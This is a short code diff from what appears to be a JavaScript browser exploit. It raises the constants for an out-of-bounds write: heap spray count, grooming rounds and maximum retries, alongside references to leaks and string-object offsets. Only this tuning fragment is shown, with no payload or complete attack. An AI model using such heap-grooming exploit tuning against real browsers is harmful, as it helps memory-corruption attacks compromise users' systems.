@@ -86,9 +86,9 @@ const num_leaks = 0x100;
 
 // OOB-write specific constants
 // NOTE: Values increased for experimentation; tune down after success.
-const OOB_SPRAY_COUNT = 0x400;
-const OOB_GROOM_ROUNDS = 0x200;
-const OOB_MAX_RETRIES = 6;
+const OOB_SPRAY_COUNT = 0x600;
+const OOB_GROOM_ROUNDS = 0x400;
+const OOB_MAX_RETRIES = 100;
 
 const rows = ",".repeat(ssv_len / 8 - 2);
 const original_strlen = ssv_len - off.size_strimpl;
